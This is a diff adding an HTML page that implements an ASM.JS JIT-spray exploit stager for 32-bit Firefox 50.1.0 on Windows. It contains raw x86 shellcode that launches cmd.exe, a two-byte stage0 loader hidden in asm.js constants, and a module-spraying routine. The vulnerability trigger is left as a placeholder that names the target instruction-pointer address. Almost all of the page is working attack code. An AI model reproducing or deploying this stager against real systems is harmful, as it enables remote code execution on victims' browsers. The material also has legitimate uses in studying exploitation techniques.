@@ -1,0 +1,187 @@
+<!DOCTYPE HTML>
+
+<!--
+
+    ASM.JS JIT SPRAY
+
+    works on 32-bit Firefox - successfully tested with 50.1.0
+
+    2-byte DYNAMIC LOADER - generated via:
+    ./sc2asmjs.py -l bin_payloads/msf_windows_exec_cmd.py -t dynamic -d 6 -o out/msf_exec_cmd_2_byte_stager.html
+
+    (C) Rh0
+
+-->
+
+<head>
+<meta charset=UTF-8 />
+<script>
+// stage0 will load and execute payload
+payload = '' +
+	'\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b' +
+	'\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7' +
+	'\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf' +
+	'\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c' +
+	'\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01' +
+	'\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31' +
+	'\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d' +
+	'\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66' +
+	'\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0' +
+	'\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f' +
+	'\x5f\x5a\x8b\x12\xeb\x8d\x5d\x6a\x01\x8d\x85\xb2\x00' +
+	'\x00\x00\x50\x68\x31\x8b\x6f\x87\xff\xd5\xbb\xfe\x0e' +
+	'\x32\xea\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a' +
+	'\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53' +
+	'\xff\xd5\x63\x6d\x64\x2e\x65\x78\x65\x00'
+
+max_payload_sz = 516 // DO NOT CHANGE
+jmp_distance = 6
+jmp = "eb"
+stage0 = [
+	'06eb306a', '06eb905e', '06ebad64', '06eb0c6a', '06eb905b', 
+	'06ebc301', '06eb038b', '06eb1c6a', '06eb905b', '06ebc301', 
+	'06eb1b8b', '06eb006a', '06eb9050', '06ebc031', '06eb4db0', 
+	'06eb4cb4', '06ebc931', '06eb4966', '06ebe1f7', '06eb2eb0', 
+	'06eb44b4', '06ebc189', '06eb9058', '06eb9051', '06eb9050', 
+	'06ebc031', '06eb34b0', '06eb32b4', '06ebc931', '06eb4966', 
+	'06ebe1f7', '06eb45b0', '06eb4cb4', '06ebc189', '06eb9058', 
+	'06eb9051', '06eb9050', '06ebc031', '06eb53b0', '06eb4eb4', 
+	'06ebc931', '06eb4966', '06ebe1f7', '06eb4bb0', '06eb45b4', 
+	'06ebc189', '06eb9058', '06eb9051', '06eb0e6a', '06eb9059', 
+	'06ebe789', '06eb904f', '10eb086a', 'caeb9090', '06eb9058', 
+	'06ebd801', '10eb288b', 'd4eb9090', '06eb206a', '10eb9058', 
+	'deeb9090', '06ebd801', '10eb308b', 'deeb9090', '06eb1b8b', 
+	'06eb4947', '06eb58e3', '06ebc031', '06ebad66', '06eb613c', 
+	'06eb127c', '06eb202c', '06eb073a', '06ebae74', '06eb90eb', 
+	'06eb006a', '06eb9050', '06ebc031', '06eb70b0', '06eb63b4', 
+	'06ebc931', '06eb4966', '06ebe1f7', '06eb6cb0', '06eb6cb4', 
+	'06ebc189', '06eb9058', '06eb9051', '06eb9050', '06ebc031', 
+	'06eb6db0', '06eb41b4', '06ebc931', '06eb4966', '06ebe1f7', 
+	'06eb75b0', '06eb61b4', '06ebc189', '06eb9058', '06eb9051', 
+	'06eb9050', '06ebc031', '06eb73b0', '06eb74b4', '06ebc931', 
+	'06eb4966', '06ebe1f7', '06eb56b0', '06eb69b4', '06ebc189', 
+	'06eb9058', '06eb9051', '06ebeb89', '06eb3c6a', '06eb9058', 
+	'06ebd801', '06eb008b', '06ebd801', '06eb786a', '06eb905d', 
+	'06ebe801', '06eb008b', '06ebd801', '06ebc589', '06eb206a', 
+	'06eb9058', '06ebe801', '06eb008b', '06ebd801', '06ebd231', 
+	'06ebe789', '06eb0d6a', '06eb5059', '06ebd001', '06eb308b', 
+	'06ebde01', '06eba6f3', '06eb9058', '06eb30e3', '06eb046a', 
+	'06eb905e', '06ebf201', '06eb86eb', '06eb246a', '06eb9058', 
+	'06ebe801', '06eb008b', '06ebd801', '06ebead1', '06ebd001', 
+	'06eb108b', '06ebc031', '06ebffb4', '06ebffb0', '06ebd021', 
+	'06eb1c6a', '06eb905a', '06ebea01', '06eb128b', '06ebda01', 
+	'06ebe0d1', '06ebe0d1', '06ebc201', '06eb128b', '06ebda01', 
+	'06eb406a', '06ebdb31', '06eb30b7', '06eb9053', '06eb10b7', 
+	'06eb9053', '06eb006a', '06ebd2ff', '06ebebd9', '06eb0c6a', 
+	'06eb905e', '06ebe601', '06ebe389', '06eb33d9', '06eb368b', 
+	'06eb646a', '06eb905f', '06ebfe01', '06ebfe01', '06ebc789', 
+	'06ebc931', '06eb00b5', '06eb81b1', '06eb066a', '06eba55b', 
+	'06ebde01', '06ebebe2', '06ebe0ff', '90909090'
+]
+
+asm_js_header = '' +
+'function asm_js_module(stdlib, foreign, heap){' + 
+'    "use asm";' +
+'    var buf = new stdlib.Uint32Array(heap);' +
+'    var rnd = foreign.rnd;' +
+'    function payload_code(){'
+
+asm_js_footer = '' +
+'    }' +
+'    return payload_code;' +
+'};' +
+/* triggers creation of many RX modules */
+'spray_modules();'
+
+
+
+function load_asmjs(){
+    code = ""
+    constant_no = 0
+    offset = 0x10
+
+    /* unecessary nop jumps */
+    for (; constant_no < 10; constant_no++){
+        code += 'buf[' + (constant_no + offset) + '] = 0x'+ jmp_distance.toString(16) + jmp + '9090;'
+    }
+
+    /* 2-byte stage0 */
+    for (i in stage0){
+        code += 'buf[' + (constant_no + offset) + '] = 0x' + stage0[i] + ";"
+        constant_no++
+    }
+    if (payload.length > max_payload_sz){
+        alert("Error: shellcode payload is too big")
+        return
+    }
+
+    /* append binary payload (if any, in case stage0 loader is used) */
+    for (var i=0; i < payload.length; i+=4){
+        code += 'buf[' + (constant_no + offset) + '] = 0x'
+        val = payload.slice(i, i + 4)
+        /* only for last iteration */
+        while (val.length < 4) val += "\x90"
+        for (var j=3; j>=0; j--){
+            code += (0x100 + val.charCodeAt(j)).toString(16).slice(1)
+        }
+        code += ';'
+        constant_no++
+    }
+
+    /* fill up payload space */
+    if (payload.length > 0){
+        for (var i=0; i < (max_payload_sz - payload.length); i+=4){
+            code += 'buf[' + (constant_no + offset) + '] = 0xcccccccc;'
+        }
+    }
+    /* https://developer.mozilla.org/en-US/docs/Games/Techniques/Async_scripts
+     */
+    asm_js = asm_js_header + code + asm_js_footer
+    /* create blob script and load it */
+    var blob = new Blob([asm_js]);
+    var script = document.createElement('script');
+    var url = URL.createObjectURL(blob);
+    script.onload = script.onerror = function() { URL.revokeObjectURL(url); };
+    script.src = url;
+    /* triggers asm module compilation and spray_modules() execution */
+    document.body.appendChild(script);
+}
+
+
+function spray_modules(){
+    buffer = new ArrayBuffer(1 << 18)
+    sprayed = []
+    for (var i=0;i<=0x1800;i++){
+        sprayed[i] = asm_js_module(window, {rnd: ffi}, buffer)
+    }
+
+    trigger_vuln()
+}
+
+function ffi(){ // foreignFunctionInterface
+    x = parseInt(Math.random() * ((1 << 18)-1))
+    return x|0;
+}
+
+
+/* GET EIP CONTROL WITH YOUR VULN HERE */
+/* SET EIP TO 0x1C1C0053 ON WINDOWS 32-bit*/
+function trigger_vuln(){
+    /* You may need to adjust this address dependent on your vuln and version */
+    alert("Set EIP to 0x1c1c0060 (32-bit Firefox 50.1.0 on Windows) with your vuln here")
+}
+
+
+</script>
+</head>
+<html>
+<body style=background:black onload=load_asmjs()>
+<h1 style=color:green>
+<pre>
+    ======================
+    == ASM.JS JIT-SPRAY ==
+    ======================
+</pre>
+</h1>
+</body>
+</html>
